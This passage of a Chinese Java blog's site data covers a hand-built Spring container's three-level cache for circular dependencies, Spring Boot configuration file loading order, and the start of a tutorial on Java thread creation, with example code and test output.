}\n\n    @override\n    public void registersingleton(string beanname, object singletonobject) {\n        singletonobjects.put(beanname, singletonobject);\n        earlysingletonobjects.remove(beanname);\n        singletonfactories.remove(beanname);\n    }\n\n    protected void addsingletonfactory(string beanname, objectfactory<?> objectfactory) {\n        if (!singletonfactories.containskey(beanname)) {\n            singletonfactories.put(beanname, objectfactory);\n            earlysingletonobjects.remove(beanname);\n        }\n    }\n\n    @override\n    public void registerdisposablebean(string beanname, disposablebean bean) {\n        disposablebeans.put(beanname, bean);\n    }\n\n    @override\n    public void destroysingletons() {\n        set<string> keyset = disposablebeans.keyset();\n        object[] disposablebeannames = keyset.toarray();\n        for (int i = disposablebeannames.length - 1; i >= 0; i--) {\n            object beanname = disposablebeannames[i];\n            disposablebean disposablebean = disposablebeans.remove(beanname);\n            try {\n                disposablebean.destroy();\n            } catch (nosuchmethodexception | invocationtargetexception | illegalaccessexception e) {\n                throw new beansexception("failed to bean:[" + beanname + "] destroy", e);\n            }\n        }\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n\n 3. defaultadvisorautoproxycreator\n\n\n * defaultadvisorautoproxycreator 是 spring framework 中的一个类，负责根据配置的 advisors 自动为 bean 创建代理。\n * 它会扫描 bean，查找任何配置的 advisors，并在必要时为这些 bean 创建动态代理。\n * 在 spring framework 中，advisors 是定义 advice 的对象，例如拦截方法调用额外的行为。\n * <br/>\n * 它的工作原理如下：\n * <br/>\n * 1. defaultadvisorautoproxycreator 在初始化阶段检查应用上下文中的所有 bean。\n * 2. 它查找配置了 advisors 的 bean。一个 advisor 通常由切面逻辑（advice）和切入点（pointcut）组成，切入点用于指定 advice 应该应用的位置。\n * 3. 对于每个配置了 advisors 的 bean，defaultadvisorautoproxycreator 创建一个代理对象，该代理对象包装了原始的 bean。\n * 4. 代理对象拦截对 bean 的方法调用，并应用配置的 advisors 定义的 advice。\n * 5. 当应用上下文中的其他 bean 请求原始 bean 时，它们将接收代理对象而不是原始对象。\n *\n * @author zhangpengjun\n * @date 2023/4/19\n */\npublic class defaultadvisorautoproxycreator implements instantiationawarebeanpostprocessor, beanfactoryaware {\n\n    private defaultlistablebeanfactory beanfactory;\n\n    private final set<string> earlyproxyreferences = collections.synchronizedset(new hashset<>());\n\n    @override\n    public void setbeanfactory(beanfactory beanfactory) {\n        this.beanfactory = (defaultlistablebeanfactory) beanfactory;\n    }\n\n    @override\n    public propertyvalues postprocesspropertyvalues(propertyvalues pvs, object bean, string beanname) {\n        return pvs;\n    }\n\n    @override\n    public object postprocessbeforeinstantiation(class<?> beanclass, string beanname) throws beansexception {\n        return null;\n    }\n\n    @override\n    public boolean postprocessafterinstantiation(object bean, string beanname) {\n        return true;\n    }\n\n    private boolean isinfrastructureclass(class<?> beanclass) {\n        return advice.class.isassignablefrom(beanclass) || pointcut.class.isassignablefrom(beanclass) || advisor.class.isassignablefrom(beanclass);\n    }\n\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) {\n        return bean;\n    }\n\n    @override\n    public object postprocessafterinitialization(object bean, string beanname) {\n        if (!earlyproxyreferences.contains(beanname)) {\n            return wrapifnecessary(bean, beanname);\n        }\n        return wrapifnecessary(bean, beanname);\n    }\n\n    private object wrapifnecessary(object bean, string beanname) {\n        if (isinfrastructureclass(bean.getclass())) {\n            return bean;\n        }\n\n        collection<aspectjexpressionpointcutadvisor> advisors = beanfactory.getbeansoftype(aspectjexpressionpointcutadvisor.class).values();\n        for (aspectjexpressionpointcutadvisor advisor : advisors) {\n            // 不匹配当前类，过滤\n            classfilter classfilter = advisor.getpointcut().getclassfilter();\n            if (classfilter != null && !classfilter.matches(bean.getclass())) {\n                continue;\n            }\n            // 转换为代理对象返回\n            advisedsupport advisedsupport = new advisedsupport();\n            advisedsupport.settargetsource(new targetsource(bean));\n            advisedsupport.setmethodmatcher(advisor.getpointcut().getmethodmatcher());\n            advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice());\n            advisedsupport.setproxytargetclass(false); // 默认使用 jdk 代理\n            return new proxyfactory(advisedsupport).getproxy();\n        }\n\n        return bean;\n    }\n\n    @override\n    public object getearlybeanreference(object bean, string beanname) {\n        earlyproxyreferences.add(beanname);\n        return wrapifnecessary(bean, beanname);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n\n\n\n# 将实现加入原有的逻辑中\n\n * 修改 abstractautowirecapablebeanfactory#createbean，在实例化之后，填充属性之前，”提前暴露“原始对象的引用（放入三级缓存），用于解决循环依赖。\n\n@override\n    protected object createbean(string beanname, beandefinition beandefinition, object[] args) throws beansexception {\n        object bean = null;\n        try {\n            // 判断是否返回 代理 bean 对象（注释原因，改用 beanpostprocessor#postprocessafterinitialization() 实现）\n            // bean = resolvebeforeinstantiation(beanname, beandefinition);\n            // if (bean != null) {\n            //     return bean;\n            // }\n            // 实例化\n            bean = createbeaninstance(beanname, beandefinition, args);\n\n            // 处理循环依赖，将实例化后的 bean 提前放入缓存中暴露出来\n            if (beandefinition.issingleton()) {\n                object finalbean = bean;\n                // ”提前暴露“原始对象的引用，用于解决循环依赖\n                addsingletonfactory(beanname, () -> getearlybeanreference(beanname, beandefinition, finalbean));\n            }\n            // 实例化后判断，对于不需要填充属性的 bean 直接返回\n            boolean continuewithpropertypopulation = applybeanpostprocessorsafterinstantiation(beanname, bean);\n            if (!continuewithpropertypopulation) {\n                return bean;\n            }\n\n            // 在设置 bean 属性之前，允许 beanpostprocessor 修改属性值（解析@value @autowired等）\n            applybeanpostprocessorsbeforeapplyingpropertyvalues(beanname, bean, beandefinition);\n            // 属性填充\n            applypropertyvalues(beanname, bean, beandefinition);\n\n            // 添加 bean 的初始化扩展\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("failed to bean:[" + beanname + "] instance", e);\n        }\n\n        // 添加单例 bean 缓存\n        if (beandefinition.issingleton()) {\n            // 注册实现了 disposablebean 接口的 单例bean 对象，留待容器停止的时候调用。\n            registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n            registersingleton(beanname, bean);\n        }\n        return bean;\n    }\n\n    private object getearlybeanreference(string beanname, beandefinition beandefinition, object bean) {\n        object exposedobject = bean;\n        for (beanpostprocessor beanpostprocessor : getbeanpostprocessors()) {\n            if (beanpostprocessor instanceof instantiationawarebeanpostprocessor) {\n                exposedobject = ((instantiationawarebeanpostprocessor) beanpostprocessor).getearlybeanreference(exposedobject, beanname);\n                if (exposedobject == null) {\n                    return exposedobject;\n                }\n            }\n        }\n        return exposedobject;\n    }\n\n    private boolean applybeanpostprocessorsafterinstantiation(string beanname, object bean) {\n        boolean continuewithpropertypopulation = true;\n        for (beanpostprocessor beanpostprocessor : getbeanpostprocessors()) {\n            if (beanpostprocessor instanceof instantiationawarebeanpostprocessor) {\n                instantiationawarebeanpostprocessor instantiationawarebeanpostprocessor = (instantiationawarebeanpostprocessor) beanpostprocessor;\n                if (!instantiationawarebeanpostprocessor.postprocessafterinstantiation(bean, beanname)) {\n                    continuewithpropertypopulation = false;\n                    break;\n                }\n            }\n        }\n        return continuewithpropertypopulation;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n\n# 测试\n\n * xml 准备，spring-cyclic-dependence.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    \x3c!--  目标类  --\x3e\n    <bean class="com.snail.springframework.cyclicdependence.a">\n        <property name="b" ref="b"></property>\n    </bean>\n    <bean class="com.snail.springframework.cyclicdependence.b">\n        <property name="a" ref="a"></property>\n        <property name="c" ref="cface"></property>\n    </bean>\n    <bean id="cface" class="com.snail.springframework.cyclicdependence.cface"></bean>\n\n    \x3c!--  aop  --\x3e\n    <bean class="com.snail.springframework.aop.framework.autoproxy.defaultadvisorautoproxycreator"/>\n\n    \x3c!--  切面逻辑  --\x3e\n    <bean id="badvice" class="com.snail.springframework.cyclicdependence.badvice"></bean>\n    <bean id="methodinterceptor" class="com.snail.springframework.aop.framework.adapter.methodbeforeadviceinterceptor">\n        <property name="methodbeforeadvice" ref="badvice"/>\n    </bean>\n\n    \x3c!--  切入点  --\x3e\n    <bean class="com.snail.springframework.aop.aspectj.aspectjexpressionpointcutadvisor">\n        <property name="advice" ref="methodinterceptor"></property>\n        \x3c!--   cglib 代理     --\x3e\n        <property name="expression" value="execution(* com.snail.springframework.cyclicdependence.iface.*(..))"></property>\n    </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n * 提前准备，a（循环引用类）、b（循环引用类）、badvice（b切面）、iface接口、cface（接口实现类）\n\npublic class a {\n\n    private b b;\n\n    public string print() {\n        return "a print b: " + b;\n    }\n\n}\npublic class b {\n\n    private a a;\n    private iface c;\n\n    public string print() {\n        return "b print a: " + a + "\\n\\t\\tb print face c: " + c.getface();\n    }\n\n}\npublic class badvice implements methodbeforeadvice {\n\n    @override\n    public void before(method method, object[] args, object target) throws throwable {\n        system.out.println("badvice before method: " + method);\n    }\n\n}\npublic interface iface {\n\n    string getface();\n\n}\npublic class cface implements factorybean<iface> {\n\n    @override\n    public iface getobject() {\n        return (iface) proxy.newproxyinstance(thread.currentthread().getcontextclassloader(), new class[]{iface.class}, ((proxy, method, args) ->\n                "proxy face method name: " + method.getname()\n        ));\n    }\n\n    @override\n    public class<?> getobjecttype() {\n        return iface.class;\n    }\n\n    @override\n    public boolean issingleton() {\n        return true;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n * 测试类\n\npublic class springcyclicdependencetest {\n\n    /**\n     * 测试三级缓存循环引用\n     */\n    @test\n    public void test_cyclic_dependence() {\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring-cyclic-dependence.xml");\n        a a = applicationcontext.getbean(a.class);\n        system.out.println("测试结果：" + a.print());\n        b b = applicationcontext.getbean(b.class);\n        system.out.println("测试结果：" + b.print());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试结果\n\n测试结果：a print b: com.snail.springframework.cyclicdependence.b$$enhancerbycglib$$d03a45b9@37374a5e\n测试结果：b print a: com.snail.springframework.cyclicdependence.a$$enhancerbycglib$$c473690e@4671e53b\n\t\tb print face c: proxy face method name: getface\n\n\n1\n2\n3\n\n\n\n# 总结\n\n以上面a、b类使用属性field注入循环依赖的例子为例，对整个流程做文字步骤总结如下：\n\n 1.  使用context.getbean(a.class)，旨在获取容器内的单例a(若a不存在，就会走a这个bean的创建流程)，显然初次获取a是不存在的，因此走a的创建之路~\n 2.  实例化a（注意此处仅仅是实例化），并将它放进缓存（此时a已经实例化完成，已经可以被引用了）\n 3.  初始化a：@autowired依赖注入b（此时需要去容器内获取b）\n 4.  为了完成依赖注入b，会通过getbean(b)去容器内找b。但此时b在容器内不存在，就走向b的创建之路~\n 5.  实例化b，并将其放入缓存。（此时b也能够被引用了）\n 6.  初始化b，@autowired依赖注入a（此时需要去容器内获取a）\n 7.  此处重要：初始化b时会调用getbean(a)去容器内找到a，上面我们已经说过了此时候因为a已经实例化完成了并且放进了缓存里，所以这个时候去看缓存里是已经存在a的引用了的，所以getbean(a)能够正常返回\n 8.  b初始化成功（此时已经注入a成功了，已成功持有a的引用了），return（注意此处return相当于是返回最上面的getbean(b)这句代码，回到了初始化a的流程中~）。\n 9.  因为b实例已经成功返回了，因此最终a也初始化成功\n 10. 到此，b持有的已经是初始化完成的a，a持有的也是初始化完成的b，完美~',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Spring Boot 配置文件加载顺序",frontmatter:{title:"Spring Boot 配置文件加载顺序",date:"2022-04-28T00:00:00.000Z",tags:["Spring Boot"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/springboot%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F.html",relativePath:"views/backend/springboot配置文件加载顺序.md",key:"v-846b2e24",path:"/views/backend/springboot%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F.html",headers:[{level:2,title:"配置文件所在的位置",slug:"配置文件所在的位置",normalizedTitle:"配置文件所在的位置",charIndex:3},{level:2,title:"配置文件的名字",slug:"配置文件的名字",normalizedTitle:"配置文件的名字",charIndex:16},{level:3,title:"1、springBoot何时加载配置文件？",slug:"_1、springboot何时加载配置文件",normalizedTitle:"1、springboot何时加载配置文件？",charIndex:29},{level:3,title:"2、springBoot加载配置文件时，不同位置及不同后缀的配置文件如何加载？",slug:"_2、springboot加载配置文件时-不同位置及不同后缀的配置文件如何加载",normalizedTitle:"2、springboot加载配置文件时，不同位置及不同后缀的配置文件如何加载？",charIndex:56},{level:3,title:"3、springBoot的{prifile}文件时是如何加载的？如:（application-dev.yml）",slug:"_3、springboot的-prifile-文件时是如何加载的-如-application-dev-yml",normalizedTitle:"3、springboot的{prifile}文件时是如何加载的？如:（application-dev.yml）",charIndex:101},{level:3,title:"4、不同位置的配置文件配置了相同的属性时 将如何加载？",slug:"_4、不同位置的配置文件配置了相同的属性时-将如何加载",normalizedTitle:"4、不同位置的配置文件配置了相同的属性时 将如何加载？",charIndex:162},{level:3,title:"5、不同位置到配置文件，设置不同属性时，后加载的文件是否会生效？",slug:"_5、不同位置到配置文件-设置不同属性时-后加载的文件是否会生效",normalizedTitle:"5、不同位置到配置文件，设置不同属性时，后加载的文件是否会生效？",charIndex:195}],excerpt:"<Boxx/>\n",headersStr:"配置文件所在的位置 配置文件的名字 1、springBoot何时加载配置文件？ 2、springBoot加载配置文件时，不同位置及不同后缀的配置文件如何加载？ 3、springBoot的{prifile}文件时是如何加载的？如:（application-dev.yml） 4、不同位置的配置文件配置了相同的属性时 将如何加载？ 5、不同位置到配置文件，设置不同属性时，后加载的文件是否会生效？",content:" * 配置文件所在的位置\n * 配置文件的名字\n   * 1、springBoot何时加载配置文件？\n   * 2、springBoot加载配置文件时，不同位置及不同后缀的配置文件如何加载？\n   * 3、springBoot的{prifile}文件时是如何加载的？如:（application-dev.yml）\n   * 4、不同位置的配置文件配置了相同的属性时 将如何加载？\n   * 5、不同位置到配置文件，设置不同属性时，后加载的文件是否会生效？\n\n\n\nSpringBoot 默认支持 properties 和 YAML 两种格式的配置文件，并且有 bootstrap 和 application 两种配置文件。\n\nbootstrap 配置文件先于 application 配置文件被加载，会先创建初始化 Bootstrap Context，再创建初始化 Application Context，应用于更早期的配置信息，可以理解为系统配置。\n\nbootstrap 和 application 共享同一个 Environment，默认情况下，bootstrap 的配置不会被覆盖，而 application 的配置项可以被覆盖。（比如被 application-dev 覆盖，或被 java 命令行覆盖）\n\n\n# 配置文件所在的位置\n\n默认值为：classpath:/, classpath:/config/, file:./, file:./config/ （优先级从低到高），最先加载file:./config/ 位置的配置文件；如果配置了spring.config.location属性则取这个属性的值。\n\n加载顺序如下：优先级由高到底，如果所有文件某个字段配置了一样的信息，高优先级的配置会覆盖低优先级的配置，但是加载的时候其他字段会进行互补配置；\n\n\n\n项目打包好以后，我们还可以使用命令行参数的形式，在启动项目的时候来指定配置文件的新位置；\n\n用指定配置文件和默认加载的这些配置文件共同起作用形成互补配置；\n\n例如：java -jar spring-boot-config-demo.jar --spring.config.location=G:/application.properties\n\n还可以在 java 命令中覆盖配置项（这里指定了新的 port 和 profile）：\n\njava -jar spring-boot-config-demo.jar --spring.profiles.active=prod --server.port=8081\n\n\n# 配置文件的名字\n\n默认值为：application; 如果配置了spring.config.name属性则取改属性值。\n\n所有的扩展名：properties xml yml yaml\n\n加载顺序如下（优先级从低到高）： properties -> xml -> yml -> yaml\n\n加载时候到的拼接过程为 location + name + “.” +ext\n\nlocation : 指的就是上面提到配置文件所在的位置。 name： 指的就是配置文件的名称 默认就是appliction。 ext: 指的就是后缀名。 然后对拼接后的资源路径进行加载。\n\n小结： 上面加载的总体过程就是两层循环，外层控制加载配置文件位置的顺序，在相同位置时，内层就是控制后缀名不同时的加载顺序。\n\n理解了上面的原理，然后主要针对如下几个问题进行回答\n\n\n# 1、springBoot何时加载配置文件？\n\n在容器启动时，会有方法调用所有监听器的onApplicationEvent方法。然后与配置加载相关的ConfigFileApplicationListener的对应方法就会被加载，执行读取配置文件操作。\n\n\n# 2、springBoot加载配置文件时，不同位置及不同后缀的配置文件如何加载？\n\nclasspath:/, classpath:/config/, file:./, file:./config/ （优先级从低到高）\n\nproperties -> xml -> yml -> yaml（优先级从低到高）\n\n加载顺序如下：\n\n 1. config/application.properties（项目根目录中config目录下）\n 2. config/application.yml\n 3. application.properties（项目根目录下）\n 4. application.yml\n 5. resources/config/application.properties（项目resources目录中config目录下）\n 6. resources/config/application.yml\n 7. resources/application.properties（项目的resources目录下）\n 8. resources/application.yml\n\n注：\n\n 1. 如果同一个目录下，有application.yml也有application.properties，默认先读取application.properties。\n 2. 如果同一个配置属性，在多个不同名的配置文件中都配置了，默认使用第1个读取到的，后面读取的不覆盖前面读取到的。\n 3. 创建SpringBoot项目时，一般配置文件都放置在“项目的resources目录下”\n\n\n# 3、springBoot的{prifile}文件时是如何加载的？如:（application-dev.yml）\n\n每次加载配置文件时都会先读取 spring.profiles.active属性，如果存在则将该配置文件装载到 加载队列的首位，然后在下次循环时进行寻找加载。\n\n\n# 4、不同位置的配置文件配置了相同的属性时 将如何加载？\n\n * 当无spring.profiles.active 时， 先读取到的属性会先生效。例如：file:./config/配置端口 8080 ；file:./配置端口8081；classpath:/config/配置端口8082 ；classpath:/配置的端口为8083 。根据上文的讲解最先读取到的时 file:./config/的8080，后面再次读取后该属性并不会生效。所以最终的配置端口为8080 (并不是后读取到到配置文件不加载，会加载；但是不生效)\n * 当有spring.profiles.active 时，配置了相同属性时是profiles上的配置生效。例如：file:./config/上的yml配置了端口 8080 但是存在 spring.profiles.active属性 dev;然后我们在dev上也配置来一个端口 8081.此时生效的为8081.\n\n\n# 5、不同位置到配置文件，设置不同属性时，后加载的文件是否会生效？\n\n会有效果。会是互补配置。即先加载先生效，后加载的不同配置产生互补效果。\n\n例如：file:./config/配置了端口8080；file:./配置了访问路径/path。最总二者的配置会达成并集的效果。即二者都生效。",normalizedContent:" * 配置文件所在的位置\n * 配置文件的名字\n   * 1、springboot何时加载配置文件？\n   * 2、springboot加载配置文件时，不同位置及不同后缀的配置文件如何加载？\n   * 3、springboot的{prifile}文件时是如何加载的？如:（application-dev.yml）\n   * 4、不同位置的配置文件配置了相同的属性时 将如何加载？\n   * 5、不同位置到配置文件，设置不同属性时，后加载的文件是否会生效？\n\n\n\nspringboot 默认支持 properties 和 yaml 两种格式的配置文件，并且有 bootstrap 和 application 两种配置文件。\n\nbootstrap 配置文件先于 application 配置文件被加载，会先创建初始化 bootstrap context，再创建初始化 application context，应用于更早期的配置信息，可以理解为系统配置。\n\nbootstrap 和 application 共享同一个 environment，默认情况下，bootstrap 的配置不会被覆盖，而 application 的配置项可以被覆盖。（比如被 application-dev 覆盖，或被 java 命令行覆盖）\n\n\n# 配置文件所在的位置\n\n默认值为：classpath:/, classpath:/config/, file:./, file:./config/ （优先级从低到高），最先加载file:./config/ 位置的配置文件；如果配置了spring.config.location属性则取这个属性的值。\n\n加载顺序如下：优先级由高到底，如果所有文件某个字段配置了一样的信息，高优先级的配置会覆盖低优先级的配置，但是加载的时候其他字段会进行互补配置；\n\n\n\n项目打包好以后，我们还可以使用命令行参数的形式，在启动项目的时候来指定配置文件的新位置；\n\n用指定配置文件和默认加载的这些配置文件共同起作用形成互补配置；\n\n例如：java -jar spring-boot-config-demo.jar --spring.config.location=g:/application.properties\n\n还可以在 java 命令中覆盖配置项（这里指定了新的 port 和 profile）：\n\njava -jar spring-boot-config-demo.jar --spring.profiles.active=prod --server.port=8081\n\n\n# 配置文件的名字\n\n默认值为：application; 如果配置了spring.config.name属性则取改属性值。\n\n所有的扩展名：properties xml yml yaml\n\n加载顺序如下（优先级从低到高）： properties -> xml -> yml -> yaml\n\n加载时候到的拼接过程为 location + name + “.” +ext\n\nlocation : 指的就是上面提到配置文件所在的位置。 name： 指的就是配置文件的名称 默认就是appliction。 ext: 指的就是后缀名。 然后对拼接后的资源路径进行加载。\n\n小结： 上面加载的总体过程就是两层循环，外层控制加载配置文件位置的顺序，在相同位置时，内层就是控制后缀名不同时的加载顺序。\n\n理解了上面的原理，然后主要针对如下几个问题进行回答\n\n\n# 1、springboot何时加载配置文件？\n\n在容器启动时，会有方法调用所有监听器的onapplicationevent方法。然后与配置加载相关的configfileapplicationlistener的对应方法就会被加载，执行读取配置文件操作。\n\n\n# 2、springboot加载配置文件时，不同位置及不同后缀的配置文件如何加载？\n\nclasspath:/, classpath:/config/, file:./, file:./config/ （优先级从低到高）\n\nproperties -> xml -> yml -> yaml（优先级从低到高）\n\n加载顺序如下：\n\n 1. config/application.properties（项目根目录中config目录下）\n 2. config/application.yml\n 3. application.properties（项目根目录下）\n 4. application.yml\n 5. resources/config/application.properties（项目resources目录中config目录下）\n 6. resources/config/application.yml\n 7. resources/application.properties（项目的resources目录下）\n 8. resources/application.yml\n\n注：\n\n 1. 如果同一个目录下，有application.yml也有application.properties，默认先读取application.properties。\n 2. 如果同一个配置属性，在多个不同名的配置文件中都配置了，默认使用第1个读取到的，后面读取的不覆盖前面读取到的。\n 3. 创建springboot项目时，一般配置文件都放置在“项目的resources目录下”\n\n\n# 3、springboot的{prifile}文件时是如何加载的？如:（application-dev.yml）\n\n每次加载配置文件时都会先读取 spring.profiles.active属性，如果存在则将该配置文件装载到 加载队列的首位，然后在下次循环时进行寻找加载。\n\n\n# 4、不同位置的配置文件配置了相同的属性时 将如何加载？\n\n * 当无spring.profiles.active 时， 先读取到的属性会先生效。例如：file:./config/配置端口 8080 ；file:./配置端口8081；classpath:/config/配置端口8082 ；classpath:/配置的端口为8083 。根据上文的讲解最先读取到的时 file:./config/的8080，后面再次读取后该属性并不会生效。所以最终的配置端口为8080 (并不是后读取到到配置文件不加载，会加载；但是不生效)\n * 当有spring.profiles.active 时，配置了相同属性时是profiles上的配置生效。例如：file:./config/上的yml配置了端口 8080 但是存在 spring.profiles.active属性 dev;然后我们在dev上也配置来一个端口 8081.此时生效的为8081.\n\n\n# 5、不同位置到配置文件，设置不同属性时，后加载的文件是否会生效？\n\n会有效果。会是互补配置。即先加载先生效，后加载的不同配置产生互补效果。\n\n例如：file:./config/配置了端口8080；file:./配置了访问路径/path。最总二者的配置会达成并集的效果。即二者都生效。",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"多线程和线程池基础",frontmatter:{title:"多线程和线程池基础",date:"2019-07-15T21:51:41.000Z",tags:["多线程","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/thread.html",relativePath:"views/backend/thread.md",key:"v-6aad76f4",path:"/views/backend/thread.html",headers:[{level:2,title:"多线程",slug:"多线程",normalizedTitle:"多线程",charIndex:3},{level:2,title:"多线程创建方式",slug:"多线程创建方式",normalizedTitle:"多线程创建方式",charIndex:10},{level:3,title:"继承 Thread 类",slug:"继承-thread-类",normalizedTitle:"继承 thread 类",charIndex:23},{level:3,title:"实现 Runable 接口",slug:"实现-runable-接口",normalizedTitle:"实现 runable 接口",charIndex:40},{level:3,title:"实现 Callable 接口",slug:"实现-callable-接口",normalizedTitle:"实现 callable 接口",charIndex:59},{level:2,title:"自己造一个并发实例",slug:"自己造一个并发实例",normalizedTitle:"自己造一个并发实例",charIndex:77},{level:2,title:"实现线程同步的几种方式",slug:"实现线程同步的几种方式",normalizedTitle:"实现线程同步的几种方式",charIndex:90},{level:2,title:"利用java工具查看死锁",slug:"利用java工具查看死锁",normalizedTitle:"利用java工具查看死锁",charIndex:105},{level:2,title:"创建线程池的几种方式",slug:"创建线程池的几种方式",normalizedTitle:"创建线程池的几种方式",charIndex:121},{level:2,title:"线程池的基本使用",slug:"线程池的基本使用",normalizedTitle:"线程池的基本使用",charIndex:135}],headersStr:"多线程 多线程创建方式 继承 Thread 类 实现 Runable 接口 实现 Callable 接口 自己造一个并发实例 实现线程同步的几种方式 利用java工具查看死锁 创建线程池的几种方式 线程池的基本使用",content:' * 多线程\n * 多线程创建方式\n   * 继承 Thread 类\n   * 实现 Runable 接口\n   * 实现 Callable 接口\n * 自己造一个并发实例\n * 实现线程同步的几种方式\n * 利用java工具查看死锁\n * 创建线程池的几种方式\n * 线程池的基本使用\n\n\n\n\n# 多线程\n\n * 这篇介绍了什么是多线程及多线程的实现方式和常用方法，写的很详细，特在此记录一下\n   \n   https://blog.csdn.net/vbirdbest/article/details/81282163\n\n\n# 多线程创建方式\n\n * 如看过上文地址，可跳过此节直接看下一节自己造一个并发实例，后面才是干货！\n\n\n# 继承 Thread 类\n\npublic class Main {\n    public static void main(String[] args) {\n        new MyThread().start();\n    }\n}\n\nclass MyThread extends Thread {\n    @Override\n    public void run() {\n        System.out.println(Thread.currentThread().getName() + "\\t" + Thread.currentThread().getId());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 实现 Runable 接口\n\n * 第一种方式是继承Thread类，因Java是单继承，如果一个类继承了Thread类，那么就没办法继承其它的类了，在继承上有一点受制，有一点不灵活，第二种方式就是为了解决第一种方式的单继承不灵活的问题，所以平常使用就使用第二种方式\n\npublic class Main {\n    public static void main(String[] args) {\n         // 将Runnable实现类作为Thread的构造参数传递到Thread类中，然后启动Thread类\n        MyRunnable runnable = new MyRunnable();\n        new Thread(runnable).start();\n    }\n}\n\nclass MyRunnable implements Runnable {\n    @Override\n    public void run() {\n        System.out.println(Thread.currentThread().getName() + "\\t" + Thread.currentThread().getId());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 实现 Callable 接口\n\n * 重写call()方法，然后包装成java.util.concurrent.FutureTask, 再然后包装成Thread\n * Callable：有返回值并且能捕获异常，能取消线程，可以判断线程是否执行完毕\n\npublic class Main {\n    public static void main(String[] args) throws Exception {\n         // 将Callable包装成FutureTask，FutureTask也是一种Runnable\n        MyCallable callable = new MyCallable();\n        FutureTask<Integer> futureTask = new FutureTask<>(callable);\n        new Thread(futureTask).start();\n\n        // get方法会阻塞调用的线程\n        Integer sum = futureTask.get();\n        System.out.println(Thread.currentThread().getName() + Thread.currentThread().getId() + "=" + sum);\n    }\n}\n\nclass MyCallable implements Callable<Integer> {\n    @Override\n    public Integer call() throws Exception {\n        System.out.println(Thread.currentThread().getName() + "\\t" + Thread.currentThread().getId() + "\\t" + new Date() + " \\tstarting...");\n\n        int sum = 0;\n        for (int i = 0; i <= 100000; i++) {\n            sum += i;\n        }\n        Thread.sleep(5000);\n\n        System.out.println(Thread.currentThread().getName() + "\\t" + Thread.currentThread().getId() + "\\t" + new Date() + " \\tover...");\n        return sum;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 自己造一个并发实例\n\n * 有人可能对多线程及并发还不是很了解，那么就简单上手一个并发实例来体验一下吧！\n\n * 注意：下边的例子，自己多运行几次，看一下不同的结果\n   \n   >  1. 当对现场加锁的时候就不会并发：\n   >     * 打印结果：张曼玉：女士 / 梁朝伟：先生\n   >  2. 而如果对线程不加锁的话，就可能会造成并发：\n   >     * 打印结果：张曼玉：先生 / 梁朝伟：女士\n   >     * 打印结果：张曼玉：女士 / 梁朝伟：先生\n\n/**\n * @className: TestThreadPool\n * @descripe: 自己造一个并发的例子\n * @author: zpj\n * @date: 2019/7/8\n * @version: 1.0\n */\npublic class TestConcurrentError{\n\tpublic static void main(String[] args){\n\t\tStudent stu = new Student("张曼玉","女士");\n\t\tPrintThread pt = new PrintThread(stu);\n\t\tChangeThread ct = new 